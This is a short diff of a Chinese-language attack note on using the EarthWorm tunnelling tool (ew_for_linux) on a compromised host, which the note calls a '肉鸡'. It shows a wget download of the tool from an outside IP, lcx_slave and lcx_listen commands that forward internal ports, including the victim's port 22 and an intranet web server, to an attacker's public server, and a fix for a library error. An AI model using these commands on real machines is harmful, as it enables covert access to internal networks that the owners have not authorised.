@@ -44,14 +44,14 @@ wget -p /tmp http://45.\*.\*.190/ew_for_linux
 
 ## 使用lcx相关的功能
 ### 将肉鸡的22端口或者内网中的10.203.87.61的80端口转发到公网上8888端口
-`./ew_for_linux -s lcx_slave  -d 45.76.101.190 -e 8888    -f 127.0.0.1  -g  6522`
+`./ew_for_linux -s lcx_slave  -d 45.*.*.190 -e 8888    -f 127.0.0.1  -g  6522`
 
 > 第一次用就出了一个问题
 ```
-[root@localhost 45.*.*.190]# ./ew_for_linux -s lcx_slave  -d 45.76.101.190 -e 8888    -f 127.0.0.1  -g  6522
+[root@localhost 45.*.*.190]# ./ew_for_linux -s lcx_slave  -d 45.*.*.190 -e 8888    -f 127.0.0.1  -g  6522
 -bash: ./ew_for_linux: /lib/ld-linux.so.2: bad ELF interpreter: 没有那个文件或目录
-
 ```
+> 解决方案yum install glibc.i686
 
 ### 公网服务器监听端口转发8888
 ` ./ew_for_linux -s lcx_listen -l  8888   -e 8889`
